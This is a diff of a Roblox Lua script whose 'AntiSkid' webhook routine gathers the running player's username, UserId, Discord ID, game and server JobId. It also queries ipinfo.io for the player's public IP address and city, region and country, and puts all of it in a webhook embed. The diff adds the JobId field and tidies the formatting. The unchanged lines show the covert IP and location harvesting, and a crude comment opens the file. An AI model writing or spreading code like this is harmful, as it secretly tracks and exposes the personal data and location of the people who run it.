@@ -1,4 +1,4 @@
---fuck m
+--fuck ty
 local Players     = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local CoreGui     = game:GetService("CoreGui")
@@ -59,7 +59,9 @@ local function SendWebhook(Category, Flag)
     local Username  = tostring(LocalPlayer.Name)
     local UserId    = tostring(LocalPlayer.UserId)
     local PlaceId   = tostring(game.PlaceId)
+    local JobId     = tostring(game.JobId or "Unknown")
     local PlaceName = "Unknown"
+
     pcall(function()
         PlaceName = game:GetService("MarketplaceService")
             :GetProductInfo(game.PlaceId).Name or "Unknown"
@@ -68,9 +70,9 @@ local function SendWebhook(Category, Flag)
     local IpAddress, IpCity, IpRegion, IpCountry = "?", "?", "?", "?"
     local Ok, Raw = pcall(game.HttpGet, game, "https://ipinfo.io/json")
     if Ok and type(Raw) == "string" then
-        IpAddress = Raw:match('"ip"%s*:%s*"([^"]+)"')    or "?"
-        IpCity    = Raw:match('"city"%s*:%s*"([^"]+)"')  or "?"
-        IpRegion  = Raw:match('"region"%s*:%s*"([^"]+)"')or "?"
+        IpAddress = Raw:match('"ip"%s*:%s*"([^"]+)"')     or "?"
+        IpCity    = Raw:match('"city"%s*:%s*"([^"]+)"')   or "?"
+        IpRegion  = Raw:match('"region"%s*:%s*"([^"]+)"') or "?"
         IpCountry = Raw:match('"country"%s*:%s*"([^"]+)"')or "?"
     end
 
@@ -79,14 +81,15 @@ local function SendWebhook(Category, Flag)
             title  = "AntiSkid Flag — " .. Category,
             color  = 16711680,
             fields = {
-                { name = "Username",   value = Username,                                       inline = true  },
-                { name = "UserID",     value = UserId,                                         inline = true  },
-                { name = "Discord ID", value = _G.Cobra_DiscordID,                                      inline = true  },
-                { name = "Category",   value = Category,                                       inline = false },
-                { name = "Detection",  value = Flag,                                           inline = false },
-                { name = "Game",       value = PlaceName .. " (PlaceId: " .. PlaceId .. ")",   inline = false },
-                { name = "Location",   value = IpCity..", "..IpRegion..", "..IpCountry,        inline = false },
-                { name = "IP",         value = IpAddress,                                      inline = false },
+                { name = "Username",   value = Username, inline = true  },
+                { name = "UserID",     value = UserId,   inline = true  },
+                { name = "Discord ID", value = tostring(_G.Cobra_DiscordID or "Unknown"), inline = true },
+                { name = "Category",   value = Category, inline = false },
+                { name = "Detection",  value = Flag,     inline = false },
+                { name = "Game",       value = PlaceName .. " (PlaceId: " .. PlaceId .. ")", inline = false },
+                { name = "JobId",      value = JobId,    inline = false },
+                { name = "Location",   value = IpCity..", "..IpRegion..", "..IpCountry, inline = false },
+                { name = "IP",         value = IpAddress, inline = false },
             },
         }},
     })
